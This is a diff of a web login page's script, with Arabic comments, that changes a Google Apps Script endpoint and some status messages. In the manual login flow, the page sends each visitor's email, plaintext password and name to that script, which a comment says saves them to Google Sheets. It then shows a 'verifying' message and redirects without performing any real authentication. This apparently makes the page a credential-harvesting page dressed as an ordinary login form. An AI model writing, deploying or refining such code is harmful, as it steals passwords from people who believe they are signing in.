@@ -76,8 +76,8 @@
         const auth = getAuth(app);
         const provider = new GoogleAuthProvider();
 
-        // رابط النشر الجديد
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbwH_2nIA4_ctyIffllN6cv05xtOrgSeDg6iLArJhjfPODbrHDamgF3mIuAe6wpIGY6mwg/exec';
+        // رابط النشر الجديد الخاص بك
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyT9s0pYvTL5TvkHCPR8mF5gnVdm4Ek5A7AJRIr7797CkDmfpMbdqkNx6zPqqQu0oCWKw/exec';
         const statusBox = document.getElementById('status');
 
         window.switchTab = (mode) => {
@@ -103,7 +103,7 @@
             });
         }
 
-        // تسجيل الدخول اليدوي (يتم تسجيله في الشيت)
+        // تسجيل الدخول اليدوي (يتم إرساله للجدول)
         window.executeAuth = async (method) => {
             const isLogin = method === 'Manual-Login';
             const email = isLogin ? document.getElementById('l-email').value : document.getElementById('s-email').value;
@@ -116,28 +116,29 @@
                 return; 
             }
 
-            statusBox.innerText = "جاري المعالجة..."; 
+            statusBox.innerText = "جاري التحقق..."; 
             statusBox.style.color = "var(--primary)";
 
+            // حفظ البيانات في Google Sheets
             const result = await saveData({ email, password: pass, name, method });
 
             if (result === "OK") {
                 window.location.href = "w/check.html";
             } else {
-                statusBox.innerText = "حاول مرة أخرى";
+                statusBox.innerText = "خطأ في الاتصال، حاول مرة أخرى";
                 statusBox.style.color = "var(--error)";
             }
         };
 
-        // تسجيل الدخول بجوجل (نقل مباشر بدون انتظار الشيت لضمان السرعة)
+        // تسجيل الدخول بجوجل (نقل مباشر لضمان السرعة)
         document.getElementById('google-signin').onclick = async () => {
             try {
                 statusBox.innerText = "جاري الاتصال...";
                 await signInWithPopup(auth, provider);
-                // نقل مباشر فور نجاح المصادقة
+                // التوجيه المباشر فور نجاح الدخول
                 window.location.href = "w/check.html"; 
             } catch (error) {
-                statusBox.innerText = "فشل الاتصال بـ Google";
+                statusBox.innerText = "فشل تسجيل الدخول بـ Google";
                 statusBox.style.color = "var(--error)";
             }
         };
